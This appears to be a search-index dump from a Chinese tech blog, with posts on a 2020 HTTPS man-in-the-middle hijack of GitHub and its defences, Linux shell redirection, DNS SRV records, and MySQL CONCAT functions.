ac+88lkDK/LVdFgl2B6kIHZiYClzKtfczG93hWvKbST4NRNHP9LiaQqdNC17e5vN HnXVUGw+yxyjMLGqkgepOnZ2Rb14kcTOGp4i5AuJuuaMwXmCo7jUwPwfLe1NUlVB Kqg6LK0Hcq4K0sZnxE8HFxiZ92WpV2AVWjRMEc/2z2shNoDvxvFUYyY1Oe67xINk myQKc+ygSBZzyLnXSFVWmHr3u5dcaaQGGAR42v6Ydr4iL38Hd4dOiBma+FXsXBIq WUjbST4VXmdaol7uzFMojA4zkxQDZAvF5XgJlAFadfySna/teik= -----END CERTIFICATE----- 1 s:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert High Assurance EV Root CA -----BEGIN CERTIFICATE----- MIIEtjCCA56gAwIBAgIQDHmpRLCMEZUgkmFf4msdgzANBgkqhkiG9w0BAQsFADBs MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3 d3cuZGlnaWNlcnQuY29tMSswKQYDVQQDEyJEaWdpQ2VydCBIaWdoIEFzc3VyYW5j ZSBFViBSb290IENBMB4XDTEzMTAyMjEyMDAwMFoXDTI4MTAyMjEyMDAwMFowdTEL MAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3 LmRpZ2ljZ","date":"2020-03-27","objectID":"https://zu1k.com/posts/events/mitm-https-hijack-github/:1:2","series":null,"tags":["GitHub","中间人"],"title":"Github等大面积https劫持","uri":"https://zu1k.com/posts/events/mitm-https-hijack-github/#香港阿里云"},{"categories":["event"],"content":"实施手段 通过检查网络和对出现的状况的分析，我认为这次MITM不是通过sni或者返回的证书进行的，而是直接针对某些ip的443端口进行的 通过控制这些ip的路由，让流量经过某些恶意节点，在某个恶意节点针对443端口进行MITM，而不检查实际访问的域名和返回的证书 并且这次事件所影响的github的ip并不全，通过doh或dot获取到国外服务器解析到的ip而不是国内使用的几个ip，可以正常访问github ","date":"2020-03-27","objectID":"https://zu1k.com/posts/events/mitm-https-hijack-github/:2:0","series":null,"tags":["GitHub","中间人"],"title":"Github等大面积https劫持","uri":"https://zu1k.com/posts/events/mitm-https-hijack-github/#实施手段"},{"categories":["event"],"content":"危害 使用TLS是保证我们访问网站时信息不被中间人窥探和篡改的有效手段，如果TLS用来加密通讯使用的证书出现问题，那么信息安全就无从谈起 TLS使用公钥密码算法交换后面数据进行对称加密使用的秘钥，作为中间人没有服务器上的私钥就无法解密获得后面加密使用的秘钥，所以即使截获到https的数据报文，也无法解密和篡改传输的内容 而本次事件使用的手法是MITM常用手法，通常情况下我们为了抓包和改包，会自己签署一个假的证书并导入自己被抓包设备的信任证书列表，然后中间人分别与服务器和客户端建立TLS连接，简单来说，中间人作为客户端从服务器获取内容，然后作为服务器向真正的客户端传输修改后的内容 所以如果我们信任了浏览器给出的警告，就会导致我们的信息包括github用户名、邮箱、密码、token和私有库泄露 ","date":"2020-03-27","objectID":"https://zu1k.com/posts/events/mitm-https-hijack-github/:3:0","series":null,"tags":["GitHub","中间人"],"title":"Github等大面积https劫持","uri":"https://zu1k.com/posts/events/mitm-https-hijack-github/#危害"},{"categories":["event"],"content":"如何防范 作为站长，首先可以确定的是，并没有什么用户无痛(无需用户进行任何操作和设置)的办法来绕过这类针对性的MITM攻击，如果需要保护用户的隐私，建议开启域名的HSTS策略，这样浏览器检查到证书错误时的警告页面上就不会显示 忽略警告 相关按钮，防止不懂的用户忽略安全警告进行访问，避免隐私数据泄露 当然，像昨天那种针对 Github Pages 的攻击只会导致用户无法访问，并不会带来隐私泄露，因为github pages是提供静态网页托管，根本不需要用户输入隐私数据 作为访客，因为这种中间人攻击肯定发生在路由路径的某一个节点处，所以我们可以使用代理绕过这个恶意节点，这应该是目前最简单最好用的方法了 同时，当我们在浏览器中发现此类警告，除非是对证书内容充分信任(如自己为了调试而签发的证书)，否则不要忽视任何此类的警告而强行访问，否则隐私信息泄露在所难免 因为我自己访问国外网站一直是使用代理，所以本次事件对我的影响几乎等于零 因为不受影响，所以也很难在第一时间发现这类事件，后续需要准备一个监控系统了 ","date":"2020-03-27","objectID":"https://zu1k.com/posts/events/mitm-https-hijack-github/:4:0","series":null,"tags":["GitHub","中间人"],"title":"Github等大面积https劫持","uri":"https://zu1k.com/posts/events/mitm-https-hijack-github/#如何防范"},{"categories":["coding"],"content":"经常会看到别人的shell脚本后面有一个 2\u003e\u00261 ，一直没去深究，今天这个话题就以这个为出发点进行展开，学习一下linux shell中重定向的话题。 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:0:0","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#"},{"categories":["coding"],"content":"特殊的东西 先来看一点linux中特殊的东西，为后面的内容打下基础 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:1:0","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#特殊的东西"},{"categories":["coding"],"content":"特殊的文件 /dev/null 空，可以将垃圾内容导入其中，就会消失 /dev/zero 零，可以从中读出无穷无尽的0 /dev/urandom 随机数，可以从中读出无穷无尽的随机数 /dev/stdin 标准输入流 /dev/stdout 标准输出流 /dev/stderr 标准错误输出流 我们可以看到后三个文件其实是个链接，指向内核的文件描述符 0\\1\\2 lrwxrwxrwx 1 root root 15 Mar 24 16:20 stderr -\u003e /proc/self/fd/2 lrwxrwxrwx 1 root root 15 Mar 24 16:20 stdin -\u003e /proc/self/fd/0 lrwxrwxrwx 1 root root 15 Mar 24 16:20 stdout -\u003e /proc/self/fd/1 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:1:1","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#特殊的文件"},{"categories":["coding"],"content":"特殊的文件描述符 在Linux shell中有三个特殊的文件描述符（File descriptor or fd）: fd0 是标准输入: stdin fd1 是标准输出: stdout fd2 是标准错误输出: stderr 通过这三个特殊的文件描述符我们可以控制输入输出流 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:1:2","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#特殊的文件描述符"},{"categories":["coding"],"content":"重定向 我们经常会接触到 \u003e 这个符号，叫做重定向，其实还有另一个符号 \u003e\u003e 有着类似的功能，他们之间有一点小区别： \u003e 是覆盖的方式 \u003e\u003e 是追加的方式 下面的内容将全部以 \u003e 为例，\u003e\u003e 除了内容是追加之外没有其他区别，就不赘述 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:2:0","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#重定向"},{"categories":["coding"],"content":"使用重定向 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:3:0","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#使用重定向"},{"categories":["coding"],"content":"重定向到文件 先来看一下最基本的重定向的使用方法，我们将 echo 命令的输出重定向到一个文件中 echo \"hello\" \u003e a.txt 执行结果： root@ubuntu:~# echo \"hello\" \u003e a.txt root@ubuntu:~# cat a.txt hello 这里是将 stdout 重定向到文件 a.txt 中，与下面的命令等价 echo \"hello\" 1\u003e a.txt 执行结果： root@ubuntu:~# rm a.txt root@ubuntu:~# echo \"hello\" 1\u003e a.txt root@ubuntu:~# cat a.txt hello 这里我们看到重定向符号 \u003e 默认是将 stdout 也就是 fd1 重定向到别处 如果我们想要将标准错误输出stderr进行重定向，只需要将上面命令中的文件描述符1修改为标准错误输出的文件描述符2即可 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:3:1","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#重定向到文件"},{"categories":["coding"],"content":"重定向到文件描述符 有些情况下 stderr 是会被程序控制写入错误日志的，如果我们想要在命令运行的时候将错误显示在屏幕上，就需要将错误输出重定向到标准输出流中 我们先来尝试一下, 这里我们没有找到一个合适的命令，就拿 ls 命令查看一个不存在的目录，这样会产生错误输出 这里错误默认是会被输出到屏幕的，只是我暂时没有找到一个更好的程序，我们先假设他不会输出到屏幕 ls error 2\u003e1 这里我们的猜想是将 stderr 重定向到 stdout, 所以写了 2\u003e1, 我们来看一下会不会成功？ root@ubuntu:~# ls error 2\u003e1 root@ubuntu:~# root@ubuntu:~# ls 1 root@ubuntu:~# cat 1 ls: cannot access 'error': No such file or directory 我们看到了，并没有输出，而是在当前目录下生成了一个文件 1, 这说明如果我们只写 \u003e1 会被当做重定向到文件 1 中 此时，我们的 \u0026 就要上场了 \u003e\u0026 是将一个流重定向到一个文件描述符的语法，所以刚刚我们应该指明要重定向到 fd1, 也就是 \u00261 ls error 2\u003e\u00261 执行结果： root@ubuntu:~# ls error 2\u003e\u00261 ls: cannot access 'error': No such file or directory 到这里我们就可以自主发挥了 将标准输出重定向到标准错误输出 echo \"hello\" 1\u003e\u00262 or echo \"hello\" \u003e\u00262 甚至我们可以玩点复杂的 (echo \"hello\" \u003e\u00269) 9\u003e\u00262 2\u003e\u00261 root@ubuntu:~# (echo \"hello\" \u003e\u00269) 9\u003e\u00262 2\u003e\u00261 hello 这里的文件描述符9会自动生成，但是去除括号就会提示错误了 root@ubuntu:~# echo \"hello\" \u003e\u00269 9\u003e\u00262 2\u003e\u00261 bash: 9: Bad file descriptor 在 bash \u003e4.0 的版本中，又出了新的重定向语法 $ ls -ld /tmp /tnt 2\u003e \u003e(sed 's/^/E: /') \u003e \u003e(sed 's/^/O: /') O: drwxrwxrwt 17 root root 28672 Nov 5 23:00 /tmp E: ls: cannot access /tnt: No such file or directory 这种写法我还没有学习，等我后面学会了再进行更新 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:3:2","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#重定向到文件描述符"},{"categories":["coding"],"content":"格式化输出 来点高端点的用法 用于格式化输出, 将标准输出和错误输出两个流重定向到不同的处理中，最后汇总 ((ls -ld /tmp /tnt |sed 's/^/O: /' \u003e\u00269 ) 2\u003e\u00261 |sed 's/^/E: /') 9\u003e\u00261| cat -n root@ubuntu:~# ((ls -ld /tmp /tnt |sed 's/^/O: /' \u003e\u00269 ) 2\u003e\u00261 |sed 's/^/E: /') 9\u003e\u00261| cat -n 1 O: drwxrwxrwt 1 root root 4096 Mar 22 18:59 /tmp 2 E: ls: cannot access '/tnt': No such file or directory 相同作用的新版语法 cat -n \u003c(ls -ld /tmp /tnt 2\u003e \u003e(sed 's/^/E: /') \u003e \u003e(sed 's/^/O: /')) root@ubuntu:~# cat -n \u003c(ls -ld /tmp /tnt 2\u003e \u003e(sed 's/^/E: /') \u003e \u003e(sed 's/^/O: /')) 1 O: drwxrwxrwt 1 root root 4096 Mar 22 18:59 /tmp 2 E: ls: cannot access '/tnt': No such file or directory ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:3:3","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#格式化输出"},{"categories":["coding"],"content":"合并文件 将输出文件 m 和 n 合并: n \u003e\u0026 m 将输入文件 m 和 n 合并: n \u003c\u0026 m ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:3:4","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#合并文件"},{"categories":["coding"],"content":"输入边界 将开始标记 tag 和结束标记 tag 之间的内容作为输入: \u003c\u003c tag 例如： root@ubuntu:~# wc -l \u003c\u003c EOF document line 1 document line 2 document line 3 EOF 3 //表明收到3行输入 它的作用是将两个 EOF 之间的内容(document) 作为输入传递给 command。 注意： 结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进 开始的delimiter前后的空格会被忽略掉 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:3:5","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#输入边界"},{"categories":["coding"],"content":"有关覆盖 如果我们用 set -o noclobber 设置bash，那bash将不会覆盖任何已经存在的文件，但是我们可以通过 \u003e| 绕过这个限制 先来看一下默认的情况 root@ubuntu:~# testfile=$(mktemp /tmp/testNoClobberDate-XXXXXX) root@ubuntu:~# date \u003e $testfile ; cat $testfile Tue 24 Mar 2020 05:05:53 PM CST root@ubuntu:~# date \u003e $testfile ; cat $testfile Tue 24 Mar 2020 05:05:56 PM CST root@ubuntu:~# date \u003e $testfile ; cat $testfile Tue 24 Mar 2020 05:06:13 PM CST 如预期的一样，每一次重定向都覆盖了原文件 下面我们设置 noclobber 标志 set -o noclobber 然后重复上面的操作试一下 root@ubuntu:~# date \u003e $testfile ; cat $testfile bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file Tue 24 Mar 2020 05:06:13 PM CST root@ubuntu:~# date \u003e $testfile ; cat $testfile bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file Tue 24 Mar 2020 05:06:13 PM CST 我们看到了bash的提示，不能覆盖已存在的文件，实际结果也是一样 如何进行绕过呢? 我们来试一下用 \u003e| 代替 \u003e root@ubuntu:~# date \u003e| $testfile ; cat $testfile Tue 24 Mar 2020 05:10:45 PM CST root@ubuntu:~# date \u003e| $testfile ; cat $testfile Tue 24 Mar 2020 05:10:49 PM CST 我们发现此时可以覆盖已经存在的文件，我们查看一下目前的设置 root@ubuntu:~# set -o | grep noclobber noclobber on noclobber 的确是开启的，所以 \u003e| 的确可以绕过这一限制 使用 set +o noclobber 关闭这个限制，防止对我们后面的使用造成影响 root@ubuntu:~# set +o noclobber root@ubuntu:~# set -o | grep noclobber noclobber off root@ubuntu:~# rm $testfile ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:4:0","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#有关覆盖"},{"categories":["coding"],"content":"其他的小点 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:5:0","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#其他的小点"},{"categories":["coding"],"content":"重定向到一处 如果我们要将 stdout 和 stderr 重定向到同一个地方，该怎么写呢？ 下面两种哪种是对的？ ls -ld /tmp /tnt 2\u003e\u00261 1\u003ea.txt ls -ld /tmp /tnt 1\u003eb.txt 2\u003e\u00261 验证一下 第一种写法 root@ubuntu:~# ls -ld /tmp /tnt 2\u003e\u00261 1\u003ea.txt ls: cannot access '/tnt': No such file or directory root@ubuntu:~# cat a.txt drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp 第二种写法 root@ubuntu:~# ls -ld /tmp /tnt 1\u003eb.txt 2\u003e\u00261 root@ubuntu:~# cat b.txt ls: cannot access '/tnt': No such file or directory drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp 我们可以看到第二种写法是正确的 同理，下面这种写法也正确 ls -ld /tmp /tnt 2\u003eb.txt 1\u003e\u00262 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:5:1","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#重定向到一处"},{"categories":["coding"],"content":"套个娃a 来点奇葩的，如果我们将 stderr 重定向到 stdout, 同时又将 stdout 重定向到 stderr 会发生什么？ 如此套娃会不会导致回环卡死？ 试一下 root@ubuntu:~# ls -ld /tmp /tnt 2\u003e\u00261 1\u003e\u00262 | sed -e s/^/++/ ++ls: cannot access '/tnt': No such file or directory ++drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp 我们发现都会从标准输出出来 反过来呢？ root@ubuntu:~# ls -ld /tmp /tnt 1\u003e\u00262 2\u003e\u00261 | sed -e s/^/++/ ls: cannot access '/tnt': No such file or directory drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp 我们发现都没有从标准输出出来，都是从标准错误输出出来的 也就是说 a\u003e\u0026b b\u003e\u0026a 这种套娃写法中， b才是出口 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:5:2","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#套个娃a"},{"categories":["coding"],"content":"阅读更多内容 如果你想了解功能，通过下面的命令查看官方文档吧 man -Len -Pless\\ +/^REDIRECTION bash 本文的参考资料： stack overflow ","date":"2020-03-24","objectID":"https://zu1k.com/posts/linux/redirect-in-shell/:6:0","series":null,"tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://zu1k.com/posts/linux/redirect-in-shell/#阅读更多内容"},{"categories":["learn"],"content":"SRV记录是服务器资源记录的缩写，是DNS服务器的数据库中支持的一种记录服务器提供的服务资源的记录，主要作用是说明一个服务器能够提供什么样的服务。 简单来说，SRV记录了哪台计算机提供了哪个服务这么一个简单的信息。 SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/learn/dns-srv-record/:0:0","series":null,"tags":["DNS"],"title":"DNS中SRV记录","uri":"https://zu1k.com/posts/learn/dns-srv-record/#"},{"categories":["learn"],"content":"RFC2782 概述和理由 目前，必须知道服务器的确切地址才能联系它或者广播问题。 SRV RR允许管理员为单个域名使用多个服务器，轻松地将服务从一个主机移动到另一个主机，并将某些主机指定为服务的主服务器，将其他主机指定为备份。 客户端要求特定域名的特定服务/协议（这里使用的词汇\"域名\"是RFC 1034上严格定义的），并获取任何可用服务器的名称。 请注意，在本文档引用“地址记录”时，它表示A RR，AAAA RR或其最现代的等价物。 RFC定义的格式 RFC2782中定义的格式是： _Service._Proto.Name TTL Class SRV Priority Weight Port Target 各字段详细说明： 字段 说明 Service 所需服务的符号名称。在Assigned Numbers或本地定义。服务标识符前面加上下划线_，以避免与自然界中出现的DNS标签发生冲突。 Proto 所需协议的符号名称。前面加下划线_，以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最常用的值，但可以使用由Assigned Numbers或本地定义的任何名称。 Proto不区分大小写。 Name 此RR所指的域名。在这个域名下SRV RR是唯一的。（英文原文好像有些语法问题） TTL Class Priority Weight Port 服务在目标主机上的端口。所需协议的符号名称，前面加下划线（_），以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最有用的值，但可以使用由Assigned Numbers定义的任何名称或本地的（如Service）。 Proto不区分大小写。范围是0-65535。 这是网络字节顺序中的16位无符号整数。 通常在Assigned Numbers中指定，但不一定如此。 Target 目标主机的域名。 域名必须有一个或多个地址记录，域名绝不能是别名。敦促（但不强求）实现在附加数据部分中返回地址记录。除非并且直到将来的标准操作允许，否则名称压缩不能用于此字段。值为“.” 表示该域名明确无法提供该服务。 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/learn/dns-srv-record/:0:1","series":null,"tags":["DNS"],"title":"DNS中SRV记录","uri":"https://zu1k.com/posts/learn/dns-srv-record/#rfc2782"},{"categories":["learn"],"content":"RFC2782 概述和理由 目前，必须知道服务器的确切地址才能联系它或者广播问题。 SRV RR允许管理员为单个域名使用多个服务器，轻松地将服务从一个主机移动到另一个主机，并将某些主机指定为服务的主服务器，将其他主机指定为备份。 客户端要求特定域名的特定服务/协议（这里使用的词汇\"域名\"是RFC 1034上严格定义的），并获取任何可用服务器的名称。 请注意，在本文档引用“地址记录”时，它表示A RR，AAAA RR或其最现代的等价物。 RFC定义的格式 RFC2782中定义的格式是： _Service._Proto.Name TTL Class SRV Priority Weight Port Target 各字段详细说明： 字段 说明 Service 所需服务的符号名称。在Assigned Numbers或本地定义。服务标识符前面加上下划线_，以避免与自然界中出现的DNS标签发生冲突。 Proto 所需协议的符号名称。前面加下划线_，以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最常用的值，但可以使用由Assigned Numbers或本地定义的任何名称。 Proto不区分大小写。 Name 此RR所指的域名。在这个域名下SRV RR是唯一的。（英文原文好像有些语法问题） TTL Class Priority Weight Port 服务在目标主机上的端口。所需协议的符号名称，前面加下划线（_），以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最有用的值，但可以使用由Assigned Numbers定义的任何名称或本地的（如Service）。 Proto不区分大小写。范围是0-65535。 这是网络字节顺序中的16位无符号整数。 通常在Assigned Numbers中指定，但不一定如此。 Target 目标主机的域名。 域名必须有一个或多个地址记录，域名绝不能是别名。敦促（但不强求）实现在附加数据部分中返回地址记录。除非并且直到将来的标准操作允许，否则名称压缩不能用于此字段。值为“.” 表示该域名明确无法提供该服务。 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/learn/dns-srv-record/:0:1","series":null,"tags":["DNS"],"title":"DNS中SRV记录","uri":"https://zu1k.com/posts/learn/dns-srv-record/#概述和理由"},{"categories":["learn"],"content":"RFC2782 概述和理由 目前，必须知道服务器的确切地址才能联系它或者广播问题。 SRV RR允许管理员为单个域名使用多个服务器，轻松地将服务从一个主机移动到另一个主机，并将某些主机指定为服务的主服务器，将其他主机指定为备份。 客户端要求特定域名的特定服务/协议（这里使用的词汇\"域名\"是RFC 1034上严格定义的），并获取任何可用服务器的名称。 请注意，在本文档引用“地址记录”时，它表示A RR，AAAA RR或其最现代的等价物。 RFC定义的格式 RFC2782中定义的格式是： _Service._Proto.Name TTL Class SRV Priority Weight Port Target 各字段详细说明： 字段 说明 Service 所需服务的符号名称。在Assigned Numbers或本地定义。服务标识符前面加上下划线_，以避免与自然界中出现的DNS标签发生冲突。 Proto 所需协议的符号名称。前面加下划线_，以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最常用的值，但可以使用由Assigned Numbers或本地定义的任何名称。 Proto不区分大小写。 Name 此RR所指的域名。在这个域名下SRV RR是唯一的。（英文原文好像有些语法问题） TTL Class Priority Weight Port 服务在目标主机上的端口。所需协议的符号名称，前面加下划线（_），以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最有用的值，但可以使用由Assigned Numbers定义的任何名称或本地的（如Service）。 Proto不区分大小写。范围是0-65535。 这是网络字节顺序中的16位无符号整数。 通常在Assigned Numbers中指定，但不一定如此。 Target 目标主机的域名。 域名必须有一个或多个地址记录，域名绝不能是别名。敦促（但不强求）实现在附加数据部分中返回地址记录。除非并且直到将来的标准操作允许，否则名称压缩不能用于此字段。值为“.” 表示该域名明确无法提供该服务。 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/learn/dns-srv-record/:0:1","series":null,"tags":["DNS"],"title":"DNS中SRV记录","uri":"https://zu1k.com/posts/learn/dns-srv-record/#rfc定义的格式"},{"categories":["learn"],"content":"SRV记录和微软的关系 SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！微软的即时通讯服务器Live Communications Server也可以依靠SRV记录定位即时通讯服务器。 SRV 记录一般是为Microsoft的活动目录设置时的应用。DNS可以独立于活动目录，但是活动目录必须有DNS的帮助才能工作。为了活动目录能够正常的工作，DNS服务器必须支持服务定位（SRV）资源记录，资源记录把服务名字映射为提供服务的服务器名字。活动目录客户和域控制器使用SRV资源记录决定域控制器的IP地址。 鉴于SRV记录可以定位特定服务器的位置，我们可以预计，在微软将来的服务器产品中SRV记录将发挥越来越多的作用。 ","date":"2020-03-24","objectID":"https://zu1k.com/posts/learn/dns-srv-record/:0:2","series":null,"tags":["DNS"],"title":"DNS中SRV记录","uri":"https://zu1k.com/posts/learn/dns-srv-record/#srv记录和微软的关系"},{"categories":["coding"],"content":"讲解与示例 ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:0","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#讲解与示例"},{"categories":["coding"],"content":"CONCAT(str1, str2, …) 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL 参数可以是字段名或具体值 注意： 如果所有参数均为非二进制字符串，则结果为非二进制字符串 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串 一个数字参数被转化为与之相等的二进制字符串格式 若要避免这种情况，可使用显式类型 cast, 例如： SELECT CONCAT(CAST(int_col AS CHAR), char_col) MySQL的concat函数可以连接一个或者多个字符串 mysql\u003e select concat('10'); +--------------+ | concat('10') | +--------------+ | 10 | +--------------+ 1 row in set (0.00 sec) mysql\u003e select concat('11','22','33'); +------------------------+ | concat('11','22','33') | +------------------------+ | 112233 | +------------------------+ 1 row in set (0.00 sec) MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL mysql\u003e select concat('11','22',null); +------------------------+ | concat('11','22',null) | +------------------------+ | NULL | +------------------------+ 1 row in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:1","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#concatstr1-str2-"},{"categories":["coding"],"content":"CONCAT(str1, str2, …) 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL 参数可以是字段名或具体值 注意： 如果所有参数均为非二进制字符串，则结果为非二进制字符串 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串 一个数字参数被转化为与之相等的二进制字符串格式 若要避免这种情况，可使用显式类型 cast, 例如： SELECT CONCAT(CAST(int_col AS CHAR), char_col) MySQL的concat函数可以连接一个或者多个字符串 mysql\u003e select concat('10'); +--------------+ | concat('10') | +--------------+ | 10 | +--------------+ 1 row in set (0.00 sec) mysql\u003e select concat('11','22','33'); +------------------------+ | concat('11','22','33') | +------------------------+ | 112233 | +------------------------+ 1 row in set (0.00 sec) MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL mysql\u003e select concat('11','22',null); +------------------------+ | concat('11','22',null) | +------------------------+ | NULL | +------------------------+ 1 row in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:1","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#mysql的concat函数可以连接一个或者多个字符串"},{"categories":["coding"],"content":"CONCAT(str1, str2, …) 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL 参数可以是字段名或具体值 注意： 如果所有参数均为非二进制字符串，则结果为非二进制字符串 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串 一个数字参数被转化为与之相等的二进制字符串格式 若要避免这种情况，可使用显式类型 cast, 例如： SELECT CONCAT(CAST(int_col AS CHAR), char_col) MySQL的concat函数可以连接一个或者多个字符串 mysql\u003e select concat('10'); +--------------+ | concat('10') | +--------------+ | 10 | +--------------+ 1 row in set (0.00 sec) mysql\u003e select concat('11','22','33'); +------------------------+ | concat('11','22','33') | +------------------------+ | 112233 | +------------------------+ 1 row in set (0.00 sec) MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL mysql\u003e select concat('11','22',null); +------------------------+ | concat('11','22',null) | +------------------------+ | NULL | +------------------------+ 1 row in set (0.00 sec) ","date":"2020-03-22","objectID":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:1","series":null,"tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://zu1k.com/posts/security/web-security/mysql-concat-concat-ws-group-concat/#mysql的concat函数在连接字符串的时候只要其中一个是null那么将返回null"},{"categories":["coding"],"content":"CONCAT_WS(separator,str1,str2,…) CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。 注意： 参数可以是字段名或具体值 如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值） mysql\u003e select concat_ws('','','','33'); +--------------------------+ | concat_ws('','','','33') | +--------------------------+ | 33 | +--------------------------+ 1 row in set (0.04 sec) 如连接后以逗号分隔 mysql\u003e select concat_ws(',','11','22','33'); +-------------------------------+ | concat_ws(',','11','22','33') | +-------------------------------+ | 11,22,33 | +-------------------------------+ 1 row in set (0.00 sec) 和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL mysql\u003e select concat_ws(',','11','22',NULL); +-------------------------------+ | concat_ws(',','11','22',NULL) | +-------------------------------+ | 11,22 | +-------------------------------+ 1 row in set (0.00 sec) 